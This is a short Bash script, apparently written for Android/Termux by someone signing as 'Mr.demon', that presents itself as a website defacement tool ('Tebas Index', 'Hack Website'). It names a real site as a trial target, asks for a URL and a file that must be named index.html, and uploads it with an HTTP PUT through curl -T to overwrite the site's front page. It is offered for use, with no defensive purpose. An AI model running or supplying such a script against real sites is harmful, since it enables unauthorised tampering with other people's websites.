#gila_coding
green="\033[32;1m"
yellow="\033[33;1m"
blue="\033[34;1m"
red="\033[35;1m"
clear
echo $blue
figlet -f future "Tebas Index"
echo $yellow "Script Ditaruh Diluar Penyimpanan Internal"
echo $red "Target Percobaan"
echo $yellow "http://contsol.co.za"
echo
echo $blue "masukan url"
echo $yellow
read -p "-->$" link
echo
echo $blue "Masukan Nama Script"
echo $green "nama script harus index.html"
echo $yellow
read -p "-->$" html
echo $red
curl -T /storage/emulated/0/$html $link
echo $yellow "+"$green"Hack Website"$blue" --->"$red" $link"
echo
echo $red"terima kasih telah menggunakan tools saya"
figlet -f future "Mr.demon"
exit